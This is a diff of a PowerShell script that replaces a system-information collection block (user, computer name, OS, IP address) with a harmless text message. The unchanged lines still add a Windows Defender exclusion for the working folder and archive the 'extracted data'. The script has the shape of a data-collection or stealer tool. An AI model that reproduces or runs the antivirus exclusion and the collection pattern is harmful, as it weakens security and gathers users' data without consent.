@@ -8,25 +8,8 @@ New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 Set-Location $basePath
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 Add-MpPreference -ExclusionPath $basePath -Force
-#Extract data
-try {
-    $userName = $env:USERNAME
-    $computerName = $env:COMPUTERNAME
-    $dateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $osVersion = (Get-CimInstance Win32_OperatingSystem).Caption
-    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback|Teredo' } | Select-Object -First 1).IPAddress
-
-    $sysInfo = @"
-User Name: $userName
-Computer Name: $computerName
-Date/Time: $dateTime
-OS Version: $osVersion
-IP Address: $ipAddress
-"@
-
-    $sysInfo | Out-File -FilePath "$dumpFolder\system_info.txt" -Encoding UTF8
-} catch {}
-
+#Create content
+"Have a nice day" | Set-Content "$dumpFolder\message.txt"
 
 # Compress extracted data
 Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
